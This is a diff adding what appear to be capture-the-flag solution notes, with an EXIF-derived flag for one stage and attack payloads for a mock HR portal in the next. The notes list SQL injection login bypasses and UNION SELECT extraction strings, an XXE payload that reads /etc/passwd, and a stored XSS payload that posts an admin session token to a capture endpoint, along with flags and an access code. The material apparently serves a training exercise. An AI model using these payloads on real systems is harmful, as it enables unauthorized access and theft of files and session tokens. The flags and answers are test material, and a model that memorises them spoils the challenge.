@@ -1,0 +1,21 @@
+Stage 2: The devil's in the EXIF
+Location: Gangnam Station, Seoul
+Last-modified date: 09/09/2026
+Phone model: iPhone 14 Pro
+Flag: RP{QPWOEIRUTYLKJHGFDSAMNB}
+
+Stage 3:
+login		employee: 	' OR '1'='1' -- 
+			admin:		' UNION SELECT user_id,username,role_id,employee_id,1,(SELECT name FROM roles WHERE roles.role_id=users.role_id) FROM users ORDER BY role_id DESC LIMIT 1 -- 
+directory	Employee Directory : x' UNION SELECT 'x','x','x','x','x','x','x','x','x','x','x','x','x' -- 
+report 		segment: x' UNION SELECT 'x','x','x' -- 
+Requests	HR Requests : x' UNION SELECT 'x','x','x','x','x','x','x','x','x' -- 
+
+xxe		Employee Data Import (XXE) : <?xml version="1.0"?>
+<!DOCTYPE employees [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<employee><name>Test</name><role>&xxe;</role><note>x</note></employee>
+
+xss		Stored XSS: <img src=x onerror="fetch('/api/peoplehub/feedback/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:window.__ADMIN_SESSION_TOKEN__})})">
+
+Emergency Access Code: BLACKOUT-7
+emplooyee	: add a link before emlooyee id and after add this payload [x' UNION SELECT 'x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x','x' --]
